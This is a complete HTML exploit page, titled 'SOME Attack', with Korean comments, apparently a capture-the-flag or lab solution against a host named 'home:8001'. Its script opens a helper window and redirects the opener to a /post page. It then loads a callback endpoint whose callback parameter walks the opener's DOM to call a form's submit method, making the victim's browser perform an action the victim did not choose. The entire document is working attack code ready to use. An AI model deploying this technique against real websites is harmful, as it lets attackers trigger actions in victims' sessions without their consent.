<!DOCTYPE html>
<html>
<head>
    <title>SOME Attack</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <script>
        // Step 1: 새 창 열기
        const win = window.open('about:blank', 'attackWindow');
        
        // Step 2: 현재 창(opener가 될 창)을 /post로 리다이렉트
        setTimeout(() => {
            window.location = 'http://home:8001/post';
        }, 500);
        
        // Step 3: 새 창에서 callback 페이지 로드
        // DOM 탐색으로 form.submit 호출!
        setTimeout(() => {
            const callback = 'window.opener.document.body.firstElementChild.nextElementSibling.firstElementChild.submit';
            win.location = 'http://home:8001/callback?callback=' + callback;
        }, 2000);
    </script>
</body>
</html>